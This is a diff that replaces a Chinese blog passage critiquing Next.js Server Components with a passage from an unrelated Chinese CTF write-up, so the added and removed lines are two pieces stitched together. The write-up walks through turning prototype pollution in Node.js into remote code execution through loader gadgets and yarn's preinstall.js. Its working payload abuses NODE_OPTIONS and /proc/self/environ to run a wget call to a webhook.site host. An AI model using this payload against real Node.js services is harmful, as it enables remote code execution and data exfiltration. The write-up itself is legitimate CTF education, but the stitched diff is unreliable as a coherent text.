@@ -1,33 +1,80 @@
-因為都用了 Next.js 的最新版本，所以直上 RSC，想來體驗這個 React 未來的重點技術之一，先講結論：「不能只有我受苦，趕快來用」。
+// index
+module.exports=(O,o) => (
+    Object.entries(O).forEach(
+        ([K,V])=>Object.entries(V).forEach(
+            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
+        )
+    ), o
+);
+```
 
-（話說如果還不清楚 RSC 是什麼，或是容易跟 SSR 搞混的話，建議可以先看這兩篇文章：[RSC From Scratch. Part 1: Server Components](https://github.com/reactwg/server-components/discussions/5) 以及 [Understanding React Server Components](https://vercel.com/blog/understanding-react-server-components)）
+很明顯有個 prototype pollution 的洞，因此這題考的就是你在 node.js 有了 prototype pollution 以後，要怎麼弄到 RCE。
 
-根據 RSC 的設計原則，如果運用得當的話，你的 bundle size 會變小，網站的性能也可能會變好，但我自己用過之後，認為它帶來的效益遠低於引進這項技術所增加的複雜度。
+這邊還有一個關鍵是 catch 裡面的 `require('./usage')`
 
-不過先強調一下，因為我用的是 Next.js 的 RSC，不代表所有的 RSC 都是同個樣子，所以這整段講的都會是「Next.js 的 RSC 的使用心得」，而不是「RSC 的使用心得」。
+最後一個關鍵是這篇論文：[Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171)，裡面提到很多從原型污染打到 RCE 的案例，然後都有附上 gadget 或是一些提示。
 
-先來講缺點好了。
+不過論文裡的其中一個洞在這題用的版本已經被修掉了：https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484
 
-首先，光是要正確理解 client component 跟 server component 就需要一些時間，可能是嘗試的時間太早，甚至連 Next.js 的官方文件都寫得不是很清楚，需要自己一直不斷嘗試才能試出來到底是什麼樣子（例如說之前前端社群有一篇[貼文](https://www.facebook.com/groups/f2e.tw/posts/6773381989365775/)就在問這個，我當初也有類似的疑惑）。
+``` js
+const { 1: name, 2: expansion = '' } =
+    RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
+```
 
-再來的話，未來在寫 component 的時候都會需要考慮到這個是 client 還是 server 還是都可以，會增加心智負擔。
+kEmptyObject 是 `ObjectFreeze(ObjectCreate(null))`，所以不會被污染了。
 
-還有就是許多 server component 可能會直接打 API 去拿資料，因此 client 在拿到資料時，就已經是 render 好的結果了。雖然乍看之下不錯（畢竟是 RSC 的賣點），但這其實會讓前端變得很難 debug。
+但總之在檔案裡面繼續找一找，就會發現另一個 `trySelf` 的 function 有同個問題，在這裏：https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454
 
-以前除了第一次的 SSR 以外，我只要打開 DevTools，就可以看到前端發了哪些請求，API 的 response 是什麼，但換成 server component 以後我看不到了，我只能看 server log 才能知道發生了什麼事情。
+``` js
+const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
+```
 
-如果出事的話，我從前端沒辦法區分出是我的 Next.js server 出錯，還是我呼叫的 API 那邊出錯，這點在開發者體驗上扣分許多。
+這邊預設值也用了 `{}`，所以可以透過原型污染去干擾這些值。
 
-但以上這些其實都還好，最雷的是 Next.js 13.4 的推出有點太趕，要嘛很多功能都沒有做好，要嘛是文件沒有寫清楚。
+下面這一段程式碼，會去載入 `./pwn.js` 而不是 `./usage.js`：
 
-舉例來說，Next.js 有一個叫做 middleware 的東西，很直覺就會理解成是一個在處理 request 之前會執行到的檔案。但文件沒有寫清楚的是，這個 middleware 跟你其他的程式碼，是跑在不同的執行環境的（現在我記得已經有補上了，Next.js 的改版也滿勤快的就是了）。
+``` js
+Object.prototype["data"] = {
+  exports: {
+    ".": "./pwn.js"
+  },
+  name: './usage.js'
+}
+Object.prototype["path"] = './'
 
-也就是說在 middleware 裡面寫一個 `global.a = 1`，你到 Next.js 的 server component 裡面 log 出 `global.a`，答案會是 undefined。
+require('./usage.js')
+```
 
-再者，middleware 並不是跑在完整的 Node.js 環境上面，而是跑在一個叫做 [Edge Runtime](https://nextjs.org/docs/app/building-your-application/rendering/edge-and-nodejs-runtimes) 的地方，有許多的功能跟 API 都不支援。
+因此透過原型污染，可以達成 require 任意文件。接下來的任務就是去找出哪個內建文件有可以使用的 payload，隊友找到 `/opt/yarn-v1.22.19/preinstall.js`，最後長這樣：
 
-之所以這樣搞，是因為 Next.js 預設了這個 middleware 就是要跑在 edge 上，就算我們根本不會用到 edge 這個功能也一樣，而且目前依然沒辦法改變這點，更多討論可以看這一串：[Switchable Runtime for Middleware (Allow Node.js APIs in Middleware) #46722](https://github.com/vercel/next.js/discussions/46722)。
+```js
+Object.prototype["data"] = {
+  exports: {
+    ".": "./preinstall.js"
+  },
+  name: './usage'
+}
+Object.prototype["path"] = '/opt/yarn-v1.22.19'
+Object.prototype.shell = "node"
+Object.prototype["npm_config_global"] = 1
+Object.prototype.env = {
+  "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//",
+  "NODE_OPTIONS": "--require=/proc/self/environ"
+}
 
-順帶一提，我目前完全不支持把 Next.js 當一個全端框架來用，也就是前後端專案全都掛在 Next.js 上，理由很簡單，那就是它本來就不適合這樣用。Next.js 它所提供的 server 目前更像是 BFF（Back-end For Front-end），可以當作前端跟其他後端的橋樑，但沒辦法自己實作出完整的功能（除非你的專案很小，功能很少）。
+require('./usage.js')
+```
 
-如果真的把後端功能搬到 Next.js 上，那注定是場悲劇。
+別人寫的 writeup：
+
+1. https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs
+
+### corCTF 2022 - sbxcalc
+
+這題最核心的部分可以看成是這樣：
+
+``` js
+var p = new Proxy({flag: window.flag || 'flag'}, {
+  get: () => 'nope'
+})
+```
